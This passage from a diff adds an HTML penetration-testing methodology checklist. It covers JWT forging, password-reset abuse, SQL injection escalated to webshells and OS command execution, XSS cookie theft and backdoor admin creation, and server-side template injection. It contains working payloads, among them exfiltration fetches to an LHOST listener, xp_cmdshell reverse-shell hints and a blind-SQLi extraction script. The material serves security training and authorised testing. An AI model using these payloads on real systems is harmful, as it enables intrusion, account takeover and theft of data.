+        <li><input type="checkbox" data-id="methodology-auth-bypass-type-juggling-wf-2-1"> Works when backend uses <code>strcmp()</code> or <code>strcasecmp()</code> without strict type checks</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-auth-bypass-jwt-attacks">15.2.3 JWT Attacks</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-0"> Decode and inspect the JWT structure:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-0-0"> <code>jwt_tool "eyJ..." -d</code> &mdash; decode header, payload, signature</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-0-1"> Check <code>alg</code> field: RS256, HS256, none</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-0-2"> Check claims: <code>sub</code>, <code>role</code>, <code>exp</code>, <code>iss</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-1"> Test algorithm confusion (RS256 &rarr; HS256):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-1-0"> <code>jwt_tool "eyJ..." -X a -pk public.pem</code> &mdash; sign with public key as HMAC secret</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-1-1"> Requires the server&rsquo;s public key (often in <code>/.well-known/jwks.json</code>)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-2"> Test none algorithm:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-2-0"> <code>jwt_tool "eyJ..." -X n</code> &mdash; strip signature, set alg to none</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-3"> Brute-force weak HMAC secrets:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-3-0"> <code>jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt</code></li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-3-1"> If cracked, forge tokens with arbitrary claims</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># JWT attack commands
+jwt_tool "eyJ..." -d                                    # Decode header + payload + signature
+jwt_tool "eyJ..." -X a -pk public.pem                   # Algorithm confusion (RS256 → HS256)
+jwt_tool "eyJ..." -X n                                  # None algorithm — strip signature
+jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt  # Brute-force HMAC secret
+jwt_tool "eyJ..." -T                                    # Interactive tamper mode</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-4"> Tamper claims and re-sign:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-4-0"> <code>jwt_tool "eyJ..." -T</code> &mdash; interactive tamper mode</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-4-1"> Change <code>sub</code> to admin, change <code>role</code> to administrator</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-jwt-attacks-wf-4-2"> Change <code>exp</code> to a future timestamp for expired-token bypass</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-auth-bypass-password-reset">15.2.4 Password Reset Flaws</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-0"> Test for predictable reset tokens:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-0-0"> Request multiple resets, compare tokens for sequential / timestamp-based patterns</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-0-1"> Brute-force short tokens if the keyspace is small</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-1"> Test Host header injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-1-0"> Set <code>Host: evil.com</code> in the reset request</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-1-1"> If the reset email contains <code>Host</code>-derived URL, token leaks to attacker</li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-1-2"> Also try <code>X-Forwarded-Host: evil.com</code> and <code>X-Original-URL</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-2"> Test parameter pollution:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-2-0"> Add duplicate email: <code>email=victim@x.com&email=attacker@x.com</code></li>
+        <li><input type="checkbox" data-id="methodology-auth-bypass-password-reset-wf-2-1"> Some frameworks use the last value; the reset token may be sent to both</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger SQLi</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-sqli-rce">15.3 SQL Injection to RCE</h3>
+<p>Once SQLi is confirmed, escalate from data extraction to OS-level code execution.</p>
+<h4 id="methodology-sqli-rce-db-fingerprint">15.3.1 Database Fingerprinting</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-0"> Identify the database engine:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-0-0"> MySQL / MSSQL: <code>SELECT @@version</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-0-1"> PostgreSQL: <code>SELECT version()</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-0-2"> Oracle: <code>SELECT banner FROM v$version</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-0-3"> SQLite: <code>SELECT sqlite_version()</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-1"> Error-based fingerprinting when output is hidden:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-1-0"> MySQL: <code>extractvalue(1, concat(0x7e, version()))</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-1-1"> MSSQL: <code>CONVERT(int, @@version)</code> triggers type conversion error with version string</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-1-2"> PostgreSQL: <code>CAST(version() AS int)</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-2"> Enumerate databases, tables, columns:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-2-0"> MySQL: <code>SELECT schema_name FROM information_schema.schemata</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-2-1"> Tables: <code>SELECT table_name FROM information_schema.tables WHERE table_schema='target'</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-db-fingerprint-wf-2-2"> Columns: <code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-sqli-rce-file-write">15.3.2 File Write to Webshell</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-0"> MySQL file write (requires FILE privilege):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-0-0"> <code>SELECT '&lt;?php system($_GET["c"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-0-1"> Check privilege: <code>SELECT file_priv FROM mysql.user WHERE user=current_user()</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-0-2"> Check <code>secure_file_priv</code> variable &mdash; must be empty or writable web path</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-1"> PostgreSQL file write via COPY:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-1-0"> <code>COPY (SELECT '&lt;?php system($_GET["c"]);?&gt;') TO '/var/www/html/shell.php'</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-1-1"> Requires superuser or <code>pg_write_server_files</code> role</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-2"> PostgreSQL large objects for binary file writes:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-2-0"> <code>SELECT lo_from_bytea(0, '\\x3c3f706870...')</code> &mdash; create large object from hex payload</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-2-1"> <code>SELECT lo_export(OID, '/var/www/html/shell.php')</code> &mdash; export to filesystem</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-2-2"> Clean up: <code>SELECT lo_unlink(OID)</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># MySQL — write webshell (requires FILE privilege + empty secure_file_priv)
+SELECT '&lt;?php system($_GET["c"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php';
+
+# PostgreSQL — COPY to write a file
+COPY (SELECT '&lt;?php system($_GET["c"]);?&gt;') TO '/var/www/html/shell.php';
+
+# PostgreSQL — large objects for binary writes
+SELECT lo_from_bytea(0, '\x3c3f706870...');     -- create LO from hex-encoded payload
+SELECT lo_export(12345, '/var/www/html/s.php');  -- export LO to disk (use returned OID)
+SELECT lo_unlink(12345);                        -- clean up</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-3"> Confirm the webshell works:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-3-0"> <code>curl http://target/shell.php?c=id</code> &mdash; verify command execution</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-file-write-wf-3-1"> Upgrade to a reverse shell immediately and remove the webshell</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-sqli-rce-os-command">15.3.3 OS Command Execution</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-0"> MSSQL xp_cmdshell:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-0-0"> Enable: <code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-0-1"> Execute: <code>EXEC xp_cmdshell 'whoami'</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-0-2"> Reverse shell: <code>EXEC xp_cmdshell 'powershell -enc [base64]'</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-1"> PostgreSQL COPY TO PROGRAM:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-1-0"> <code>COPY (SELECT '') TO PROGRAM 'id'</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-1-1"> Requires superuser; available in PostgreSQL 9.3+</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-2"> PostgreSQL UDF for persistent RCE:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-2-0"> Compile: <code>gcc -I\"$(pg_config --includedir-server)\" -fPIC -shared rce_ext.c -o rce_ext.so</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-2-1"> <code>CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-os-command-wf-2-2"> <code>SELECT rce('id')</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># MSSQL — enable and use xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+# PostgreSQL — COPY TO PROGRAM (9.3+, requires superuser)
+COPY (SELECT '') TO PROGRAM 'id';
+
+# PostgreSQL — UDF for persistent RCE
+gcc -I"$(pg_config --includedir-server)" -fPIC -shared rce_ext.c -o rce_ext.so
+# Then in SQL:
+CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;
+SELECT rce('id');</code></pre>
+
+<h4 id="methodology-sqli-rce-blind-extraction">15.3.4 Blind Data Extraction</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-0"> Time-based blind injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-0-0"> MySQL: <code>IF(SUBSTRING(user(),1,1)='r', SLEEP(2), 0)</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-0-1"> PostgreSQL: <code>SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN pg_sleep(2) ELSE pg_sleep(0) END</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-0-2"> MSSQL: <code>IF (SUBSTRING(system_user,1,1)='s') WAITFOR DELAY '0:0:2'</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-1"> Boolean-based blind injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-1-0"> Compare response length / content for TRUE vs FALSE conditions</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-1-1"> MySQL: <code>AND SUBSTRING(user(),1,1)='r'</code></li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-1-2"> Automate with binary search over ASCII values</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-2"> Script the extraction in Python:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-2-0"> Use <code>requests.Session()</code> with a timing loop</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-2-1"> Extract one character at a time, measure response time</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-2-2"> Build the full string character by character</li>
+        <li><input type="checkbox" data-id="methodology-sqli-rce-blind-extraction-wf-2-3"> Consider <code>sqlmap -u "http://target/?id=1" --os-shell</code> for automation</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-python">import requests, time, string
+
+s = requests.Session()
+s.verify = False
+extracted = ""
+
+for pos in range(1, 50):
+    for c in string.printable:
+        # Time-based blind — MySQL example
+        payload = f"' AND IF(SUBSTRING(user(),{pos},1)='{c}', SLEEP(2), 0)-- -"
+        start = time.time()
+        s.get(f"http://target/page?id=1{payload}")
+        if time.time() - start > 2:
+            extracted += c
+            print(f"[+] {extracted}")
+            break
+    else:
+        break  # no char matched — end of string
+
+print(f"[*] Extracted: {extracted}")</code></pre>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger SQLi</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SQLi</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-xss">15.4 Cross-Site Scripting to Account Takeover</h3>
+<p>Find a reflection or stored injection point, escalate to session hijacking or admin-action forgery.</p>
+<h4 id="methodology-xss-reflection">15.4.1 Reflection Discovery</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xss-reflection-wf-0"> Inject a unique canary string in every input:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-0-0"> <code>curl -s "http://target/search?q=xsscanary123" | grep xsscanary123</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-0-1"> Check query parameters, POST body fields, headers (Referer, User-Agent), URL path segments</li>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-0-2"> Note the context: inside HTML tag, inside attribute, inside <code>&lt;script&gt;</code> block, inside comment</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-reflection-wf-1"> Determine the rendering context:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-1-0"> HTML context: inject <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-1-1"> Attribute context: break out with <code>" onmouseover="alert(1)</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-1-2"> JavaScript context: break string with <code>';alert(1)//</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-1-3"> URL context: <code>javascript:alert(1)</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-reflection-wf-2"> Check for DOM-based XSS separately:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-2-0"> Dangerous sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-reflection-wf-2-1"> Sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-xss-payload-crafting">15.4.2 Payload Crafting</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-0"> Start with a polyglot that works in multiple contexts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-0-0"> <code>jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-1"> Try alternate event handlers if common ones are filtered:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-1-0"> <code>&lt;svg/onload=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-1-1"> <code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-1-2"> <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-1-3"> <code>&lt;body onresize=alert(1)&gt;</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-2"> Bypass filters with encoding:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-2-0"> HTML entities: <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-2-1"> JavaScript hex: <code>\\x3cscript\\x3ealert(1)\\x3c/script\\x3e</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-2-2"> Template literals: <code>${{alert(1)}}</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-payload-crafting-wf-2-3"> Unicode escapes: <code>\\u0061lert(1)</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-xss-session-theft">15.4.3 Cookie &amp; Session Theft</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-0"> Exfiltrate cookies via fetch:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-0-0"> <code>&lt;script&gt;fetch("http://LHOST/x?c="+document.cookie)&lt;/script&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-0-1"> Start a listener: <code>python3 -m http.server 80</code> and watch for the cookie in the request</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-javascript">// Cookie exfiltration payload
+&lt;script&gt;fetch("http://LHOST/x?c="+document.cookie)&lt;/script&gt;
+
+// CSRF token steal + admin action chain
+&lt;script&gt;
+fetch("/admin/settings", {credentials:"include"})
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+    let csrf = html.match(/name="csrf_token" value="([^"]+)"/)[1];
+    fetch("/admin/create-user", {
+      method: "POST",
+      credentials: "include",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: "username=backdoor&amp;password=P@ss123&amp;role=admin&amp;csrf_token=" + csrf
+    });
+  });
+&lt;/script&gt;</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-1"> Steal CSRF tokens for chained attacks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-1-0"> Fetch the admin page: <code>fetch("/admin/settings", {{credentials:"include"}})</code></li>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-1-1"> Parse the CSRF token from the response HTML</li>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-1-2"> POST the privileged action with the stolen token</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-2"> Check cookie security flags:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-2-0"> <code>HttpOnly</code> prevents JavaScript access &mdash; pivot to CSRF-based attacks instead</li>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-2-1"> <code>Secure</code> limits to HTTPS &mdash; ensure exfil URL uses HTTPS</li>
+        <li><input type="checkbox" data-id="methodology-xss-session-theft-wf-2-2"> <code>SameSite</code> may block cross-origin requests</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-xss-admin-actions">15.4.4 XSS to Admin Actions</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-0"> Create a backdoor admin account via stored XSS:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-0-0"> Inject payload that fetches the admin user-creation form</li>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-0-1"> Parse the CSRF token, POST a new admin user with attacker-controlled credentials</li>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-0-2"> Wrap in an IIFE so the payload fires once per victim visit</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-1"> Exfiltrate sensitive data:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-1-0"> Fetch <code>/admin/users</code>, <code>/api/config</code>, database connection strings</li>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-1-1"> Send results to <code>http://LHOST/exfil</code> via <code>fetch()</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-2"> Establish persistence:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-2-0"> IndexedDB storage for persistent loot collection across sessions</li>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-2-1"> WebSocket channel for real-time interaction with the victim browser</li>
+        <li><input type="checkbox" data-id="methodology-xss-admin-actions-wf-2-2"> Service Worker registration for persistent code execution</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer">PortSwigger XSS</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings XSS</a></p>
+
+<h3 id="methodology-ssti">15.5 Server-Side Template Injection</h3>
+<p>Detect the template engine, then escalate from expression evaluation to OS command execution.</p>
+<h4 id="methodology-ssti-detection">15.5.1 Template Engine Detection</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssti-detection-wf-0"> Inject arithmetic probes to confirm template evaluation:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-0-0"> <code>{{{{7*7}}}}</code> &mdash; Jinja2, Twig, Handlebars (returns 49)</li>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-0-1"> <code>${{7*7}}</code> &mdash; Freemarker, Thymeleaf, EL (returns 49)</li>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-0-2"> <code>#{{7*7}}</code> &mdash; Thymeleaf, Pebble (returns 49)</li>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-0-3"> <code>*{{7*7}}</code> &mdash; some EL implementations</li>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-0-4"> <code>&lt;%= 7*7 %&gt;</code> &mdash; ERB, EJS (returns 49)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssti-detection-wf-1"> Distinguish between engines with type-sensitive probes:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-1-0"> <code>{{{{7*'7'}}}}</code> &mdash; Jinja2 returns <code>7777777</code>, Twig returns <code>49</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-1-1"> <code>{{{{"foo".__class__}}}}</code> &mdash; Jinja2 returns <code>&lt;class 'str'&gt;</code>, others error</li>
+      </ul>
+    </li>
+  </ul>
+<h5>SSTI Engine Detection Matrix</h5>
+<table class="custom-table">
+  <thead>
+    <tr><th>Probe</th><th>Jinja2</th><th>Twig</th><th>Freemarker</th><th>ERB</th><th>EJS</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>{{7*7}}</code></td><td>49</td><td>49</td><td>Error</td><td>Literal</td><td>Literal</td></tr>
+    <tr><td><code>${7*7}</code></td><td>Literal</td><td>Literal</td><td>49</td><td>Literal</td><td>Literal</td></tr>
+    <tr><td><code>&lt;%= 7*7 %&gt;</code></td><td>Literal</td><td>Literal</td><td>Literal</td><td>49</td><td>49</td></tr>
+    <tr><td><code>{{7*'7'}}</code></td><td>7777777</td><td>49</td><td>Error</td><td>Literal</td><td>Literal</td></tr>
+    <tr><td><code>{{"foo".__class__}}</code></td><td>&lt;class 'str'&gt;</td><td>Error</td><td>Error</td><td>Error</td><td>Error</td></tr>
+  </tbody>
+</table>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssti-detection-wf-2"> Check for blind SSTI:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-2-0"> No output reflected? Try time-based: template that triggers a delay</li>
+        <li><input type="checkbox" data-id="methodology-ssti-detection-wf-2-1"> Or OOB: template that makes a DNS/HTTP callback to your server</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ssti-jinja2">15.5.2 Jinja2 / Flask Exploitation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-0"> MRO class traversal for subprocess access:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-0-0"> <code>{{{{''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1).communicate()[0]}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-0-1"> Find the index of <code>subprocess.Popen</code> in the subclass list</li>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-0-2"> Enumerate: <code>{{{{''.__class__.__mro__[1].__subclasses__()}}}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-1"> Flask config globals shortcut:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-1-0"> <code>{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-1-1"> Also: <code>{{{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-2"> Filter bypass techniques:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-2-0"> Dot filter: use <code>|attr('__class__')</code> instead of <code>.__class__</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-2-1"> Underscore filter: hex encoding <code>request|attr('\\x5f\\x5fglobals\\x5f\\x5f')</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-jinja2-wf-2-2"> String concatenation: <code>'\\x5f\\x5f'+'class'+'\\x5f\\x5f'</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ssti-other-engines">15.5.3 Other Template Engines</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-0"> Freemarker (Java):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-0-0"> <code>&lt;#assign ex = "freemarker.template.utility.Execute"?new()&gt;${{ex("id")}}</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-0-1"> Also: <code>ObjectConstructor</code> for arbitrary Java class instantiation</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-1"> Twig (PHP):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-1-0"> Twig 1.x: <code>{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("id")}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-1-1"> Twig 2.x/3.x: <code>{{{{["id"]|map("system")|join}}}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-2"> ERB (Ruby):
